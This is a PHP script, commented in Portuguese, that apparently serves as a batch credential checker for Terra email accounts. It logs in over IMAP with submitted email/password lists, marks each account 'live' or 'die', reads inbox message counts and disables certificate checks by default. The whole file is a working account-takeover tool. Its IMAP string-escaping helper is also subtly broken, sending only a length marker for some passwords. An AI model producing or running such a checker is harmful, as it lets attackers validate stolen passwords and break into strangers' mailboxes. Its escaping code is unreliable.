<?php
/**
 * terra_validator_v4.php
 * Validador IMAP via Socket TLS direto (sem extensão imap).
 * Funciona em qualquer hosting com openssl habilitado.
 */
declare(strict_types=1);
header('Content-Type: application/json; charset=utf-8');

class TerraValidator {
    private array $config;
    private array $diag = [];

    public function __construct() {
        $this->config = [
            'imap_server'   => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
            'imap_port'     => (int)(getenv('IMAP_PORT') ?: 993),
            'timeout'       => (int)(getenv('IMAP_TIMEOUT') ?: 15),
            'max_retries'   => (int)(getenv('MAX_RETRIES') ?: 3),
            'validate_cert' => filter_var(getenv('IMAP_VALIDATE_CERT') ?: 'false', FILTER_VALIDATE_BOOL),
        ];
    }

    // ──────────────────────────────────────────────
    //  PONTO DE ENTRADA PÚBLICO
    // ──────────────────────────────────────────────

    public function validate(string $email, string $password): array {
        $attempt   = 0;
        $last_err  = '';
        $start     = microtime(true);

        while ($attempt < $this->config['max_retries']) {
            $attempt++;
            $this->diag = [];

            try {
                $result = $this->attemptLogin($email, $password);

                if ($result['status'] === 'live') {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

                $last_err = $result['message'] ?? 'Erro desconhecido';

                // Credenciais inválidas → não retentar
                if (($result['reason'] ?? '') === 'invalid_credentials') {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

                // Erro não-recuperável → não retentar
                if (!($result['retryable'] ?? false)) {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

            } catch (\Throwable $e) {
                $last_err = $e->getMessage();
                $this->diag[] = 'Exception: ' . $last_err;
            }

            // Backoff exponencial: 1s, 2s, 4s...
            if ($attempt < $this->config['max_retries']) {
                usleep((int)(pow(2, $attempt - 1) * 1000000));
            }
        }

        return [
            'status'      => 'die',
            'email'       => $email,
            'attempts'    => $attempt,
            'last_error'  => $last_err,
            'reason'      => 'max_retries_exceeded',
            'elapsed_ms'  => round((microtime(true) - $start) * 1000, 2),
            'diagnostics' => $this->diag,
            'timestamp'   => date('Y-m-d H:i:s'),
        ];
    }

    public function validateBatch(array $credentials): array {
        $results = [];
        foreach ($credentials as $cred) {
            $email    = $cred['email']    ?? '';
            $password = $cred['password'] ?? '';

            if ($email === '' || $password === '') {
                $results[] = [
                    'email'   => $email,
                    'status'  => 'error',
                    'message' => 'Email ou senha ausentes',
                ];
                continue;
            }
            $results[] = $this->validate($email, $password);
        }

        return [
            'total'     => count($results),
            'live'      => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'live')),
            'die'       => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'die')),
            'results'   => $results,
            'timestamp' => date('Y-m-d H:i:s'),
        ];
    }

    // ──────────────────────────────────────────────
    //  CONEXÃO E AUTENTICAÇÃO
    // ──────────────────────────────────────────────

    /**
     * Conecta via socket TLS, faz handshake IMAP e autentica.
     */
    private function attemptLogin(string $email, string $password): array {
        // 1. Resolver DNS
        $ip = @gethostbynamel($this->config['imap_server']);
        if (empty($ip)) {
            $this->diag[] = "DNS falhou para {$this->config['imap_server']}";
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Falha de DNS',
                'reason'    => 'dns_error',
                'retryable' => true,
            ];
        }
        $resolved_ip = $ip[0];
        $this->diag[] = "DNS resolvido: {$resolved_ip}";

        // 2. Conectar via socket TCP + TLS
        $remote   = sprintf('tls://%s:%d', $this->config['imap_server'], $this->config['imap_port']);
        $errno    = 0;
        $errstr   = '';
        $context  = stream_context_create([
            'ssl' => [
                'verify_peer'       => $this->config['validate_cert'],
                'verify_peer_name'  => $this->config['validate_cert'],
                'allow_self_signed' => !$this->config['validate_cert'],
            ],
        ]);

        $socket = @stream_socket_client(
            $remote,
            $errno,
            $errstr,
            $this->config['timeout'],
            STREAM_CLIENT_CONNECT,
            $context
        );

        if ($socket === false) {
            $this->diag[] = "Socket falhou: errno={$errno} errstr={$errstr}";
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Falha de conexão TCP/TLS',
                'reason'    => 'connection_error',
                'retryable' => true,
                'error_detail' => "errno={$errno}; {$errstr}",
            ];
        }

        stream_set_timeout($socket, $this->config['timeout']);
        $this->diag[] = 'Socket TLS conectado';

        // 3. Ler greeting do servidor IMAP
        $greeting = $this->readLine($socket);
        if ($greeting === null) {
            fclose($socket);
            $this->diag[] = 'Greeting vazio ou nulo';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Sem resposta do servidor (greeting)',
                'reason'    => 'empty_greeting',
                'retryable' => true,
            ];
        }

        if (stripos($greeting, 'OK') === false) {
            fclose($socket);
            $this->diag[] = "Greeting inesperado: {$greeting}";
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Servidor não é IMAP válido',
                'reason'    => 'bad_greeting',
                'retryable' => false,
                'error_detail' => trim($greeting),
            ];
        }
        $this->diag[] = 'Greeting OK recebido';

        // 4. Enviar comando LOGIN
        $tag     = 'A0001';
        $safe_em = $this->escapeImapString($email);
        $safe_pw = $this->escapeImapString($password);
        $cmd     = sprintf("%s LOGIN %s %s\r\n", $tag, $safe_em, $safe_pw);

        $written = fwrite($socket, $cmd);
        if ($written === false) {
            fclose($socket);
            $this->diag[] = 'Falha ao enviar LOGIN';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Falha ao enviar comando',
                'reason'    => 'write_error',
                'retryable' => true,
            ];
        }
        $this->diag[] = 'Comando LOGIN enviado';

        // 5. Ler resposta até linha tagged
        $response = $this->readUntilTag($socket, $tag);
        $meta     = stream_get_meta_data($socket);

        if ($response === null) {
            fclose($socket);
            $this->diag[] = 'Resposta nula do LOGIN';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Sem resposta após LOGIN',
                'reason'    => 'empty_response',
                'retryable' => true,
            ];
        }

        if (!empty($meta['timed_out'])) {
            fclose($socket);
            $this->diag[] = 'Timeout aguardando resposta do LOGIN';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Timeout aguardando resposta',
                'reason'    => 'timeout',
                'retryable' => true,
            ];
        }

        // 6. Analisar resposta
        $resp_lower = strtolower($response);

        // A1 OK — autenticado com sucesso
        if (preg_match('/' . preg_quote($tag, '/') . '\s+OK/i', $response)) {
            $num_messages = $this->tryFetchMessageCount($socket);

            // Logout limpo
            fwrite($socket, "A0002 LOGOUT\r\n");
            fclose($socket);

            $this->diag[] = 'Login OK';
            return [
                'status'           => 'live',
                'email'            => $email,
                'message'          => 'Autenticação bem-sucedida',
                'mailbox_messages' => $num_messages,
                'authenticated_at' => date('Y-m-d H:i:s'),
            ];
        }

        // A1 NO — credenciais inválidas
        if (preg_match('/' . preg_quote($tag, '/') . '\s+NO/i', $response)) {
            fclose($socket);
            $this->diag[] = 'Login NO (credenciais inválidas)';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Invalid credentials',
                'reason'    => 'invalid_credentials',
                'retryable' => false,
                'error_detail' => $this->extractImapError($response),
            ];
        }

        // A1 BAD — comando rejeitado
        if (preg_match('/' . preg_quote($tag, '/') . '\s+BAD/i', $response)) {
            fclose($socket);
            $this->diag[] = 'Login BAD: ' . trim($response);
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Comando rejeitado pelo servidor',
                'reason'    => 'bad_command',
                'retryable' => false,
                'error_detail' => $this->extractImapError($response),
            ];
        }

        // Resposta inesperada
        fclose($socket);
        $this->diag[] = 'Resposta inesperada: ' . trim($response);
        return [
            'status'    => 'die',
            'email'     => $email,
            'message'   => 'Resposta IMAP inesperada',
            'reason'    => 'unexpected_response',
            'retryable' => true,
            'error_detail' => trim($response),
        ];
    }

    // ──────────────────────────────────────────────
    //  HELPERS DE LEITURA DO SOCKET
    // ──────────────────────────────────────────────

    /**
     * Lê uma única linha do socket.
     */
    private function readLine($socket): ?string {
        $line = @fgets($socket, 8192);
        return ($line !== false && $line !== '') ? $line : null;
    }

    /**
     * Lê todas as linhas até encontrar a tagged response (A0001 OK/NO/BAD).
     */
    private function readUntilTag($socket, string $tag): ?string {
        $buffer   = '';
        $deadline = microtime(true) + $this->config['timeout'];

        while (!feof($socket)) {
            $line = @fgets($socket, 8192);
            if ($line === false) {
                break;
            }
            $buffer .= $line;

            // Linha tagged encontrada?
            if (strpos(trim($line), $tag . ' ') === 0) {
                return $buffer;
            }

            // Timeout
            if (microtime(true) > $deadline) {
                break;
            }
        }

        return $buffer !== '' ? $buffer : null;
    }

    // ──────────────────────────────────────────────
    //  HELPERS DE PROTOCOLO IMAP
    // ──────────────────────────────────────────────

    /**
     * Escapa string para o protocolo IMAP (RFC 3501).
     * Strings com caracteres especiais usam literais {n}\r\n.
     */
    private function escapeImapString(string $str): string {
        // Se contém aspas, barras invertidas ou caracteres de controle → literal
        if (preg_match('/[\x00-\x1F\x7F"\\]/', $str)) {
            $len = strlen($str);
            return sprintf('{%d}', $len);
            // O servidor responderá com + e então enviamos a string
            // Mas para simplicidade, usamos aspas duplas com escape
        }
        return '"' . $str . '"';
    }

    /**
     * Extrai mensagem de erro de uma resposta IMAP tagged.
     */
    private function extractImapError(string $response): string {
        $lines = explode("\r\n", $response);
        foreach (array_reverse($lines) as $line) {
            $line = trim($line);
            if ($line !== '') {
                // Remove a tag e o status (OK/NO/BAD)
                $cleaned = preg_replace('/^A\d+\s+(OK|NO|BAD)\s*/i', '', $line);
                return $cleaned;
            }
        }
        return trim($response);
    }

    /**
     * Tenta obter contagem de mensagens após login bem-sucedido.
     */
    private function tryFetchMessageCount($socket): int {
        // Envia STATUS INBOX (MESSAGES)
        $tag = 'A0001S';
        $cmd = sprintf("%s STATUS INBOX (MESSAGES)\r\n", $tag);
        fwrite($socket, $cmd);

        $resp = $this->readUntilTag($socket, $tag);
        if ($resp !== null && preg_match('/MESSAGES\s+(\d+)/i', $resp, $m)) {
            return (int)$m[1];
        }

        // Fallback: SELECT INBOX e ler EXISTS
        $tag2 = 'A0001C';
        fwrite($socket, sprintf("%s SELECT INBOX\r\n", $tag2));
        $resp2 = $this->readUntilTag($socket, $tag2);
        if ($resp2 !== null && preg_match('/(\d+)\s+EXISTS/i', $resp2, $m)) {
            // Fecha a mailbox
            fwrite($socket, sprintf("%s CLOSE\r\n", 'A0001D'));
            $this->readUntilTag($socket, 'A0001D');
            return (int)$m[1];
        }

        return 0;
    }
}

// ════════════════════════════════════════════════
//  EXECUÇÃO
// ════════════════════════════════════════════════

$input = $_POST;
$content_type = $_SERVER['CONTENT_TYPE'] ?? '';

if (empty($input) && stripos($content_type, 'application/json') !== false) {
    $raw = file_get_contents('php://input');
    if (!empty($raw)) {
        $decoded = json_decode($raw, true);
        if (is_array($decoded)) {
            $input = $decoded;
        }
    }
}

$email    = $input['email']    ?? '';
$password = $input['password'] ?? '';
$batch    = $input['batch']    ?? null;

if ($batch && is_array($batch)) {
    $validator = new TerraValidator();
    echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);

} elseif ($email !== '' && $password !== '') {
    $validator = new TerraValidator();
    echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);

} else {
    http_response_code(400);
    echo json_encode([
        'error' => 'Credenciais ausentes',
        'usage' => [
            'simple' => 'POST email=user@terra.com.br&password=senha123',
            'json'   => 'POST {"email":"user@terra.com.br","password":"senha123"}',
            'batch'  => 'POST {"batch":[{"email":"user1@terra.com.br","password":"pass1"},...]}',
        ],
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}
